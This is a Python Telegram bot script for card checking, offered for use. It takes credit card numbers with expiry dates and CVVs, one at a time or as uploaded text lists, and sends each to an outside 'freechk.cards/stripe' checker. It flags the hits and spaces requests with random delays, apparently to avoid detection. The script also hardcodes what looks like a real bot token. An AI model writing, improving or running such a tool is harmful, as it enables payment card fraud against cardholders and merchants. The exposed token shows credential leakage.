import requests
import json
import time
import random
import os
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# === CONFIG ===
TOKEN = "7908952043:AAFCen0ZLLSq1U2v-oKw-emiReRnkP9FaKw"  # <<<<< PUT YOUR BOT TOKEN HERE
BASE_URL = "https://freechk.cards/stripe/free.php?lista="
MIN_DELAY = 3
MAX_DELAY = 7
# =============

# Delay function
def rand_delay():
    delay = random.uniform(MIN_DELAY, MAX_DELAY)
    time.sleep(delay)

# Process single card
def check_card(card):
    try:
        url = BASE_URL + card.strip()
        resp = requests.get(url, timeout=15)
        try:
            return resp.json(), True
        except:
            return resp.text[:500], False
    except Exception as e:
        return f"ERROR: {e}", False

# Process list of cards
def process_cards(cards):
    results = []
    for i, card in enumerate(cards):
        result, is_json = check_card(card)
        if is_json:
            results.append(f"[HIT {i+1}] {card}\n```json\n{json.dumps(result, indent=2)}\n```")
        else:
            results.append(f"[RAW {i+1}] {card}\n```\n{result}\n```")
        if i < len(cards) - 1:
            rand_delay()
    return "\n\n".join(results)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send me:\n"
        "- A single CC: `4242|12|26|123`\n"
        "- Or a .txt file with one CC per line\n"
        "I’ll check and send full results."
    )

# Handle text (single CC)
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card = update.message.text.strip()
    if '|' not in card or len(card.split('|')) != 4:
        await update.message.reply_text("Invalid format. Use: `card|mm|yyyy|cvv`")
        return

    await update.message.reply_text(f"Checking: `{card}`")
    result, is_json = check_card(card)
    if is_json:
        await update.message.reply_text(f"```json\n{json.dumps(result, indent=2)}\n```", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"```\n{result}\n```", parse_mode='Markdown')

# Handle file
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        await update.message.reply_text("Only .txt files, dumbass.")
        return

    await update.message.reply_text("Downloading file...")
    file_obj = await file.get_file()
    file_path = f"temp_{file.file_unique_id}.txt"
    await file_obj.download_to_drive(file_path)

    with open(file_path, 'r', encoding='utf-8') as f:
        cards = [line.strip() for line in f if line.strip() and '|' in line]

    os.remove(file_path)

    if not cards:
        await update.message.reply_text("No valid cards in file.")
        return

    await update.message.reply_text(f"Loaded {len(cards)} cards. Processing...")
    result_text = process_cards(cards)
    
    # Split if too long
    if len(result_text) > 4000:
        chunks = [result_text[i:i+4000] for i in range(0, len(result_text), 4000)]
        for chunk in chunks:
            await update.message.reply_text(chunk, parse_mode='Markdown')
    else:
        await update.message.reply_text(result_text, parse_mode='Markdown')

# Main
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("[BOT LIVE] Send a CC or .txt file.")
    app.run_polling()

if __name__ == "__main__":
    main()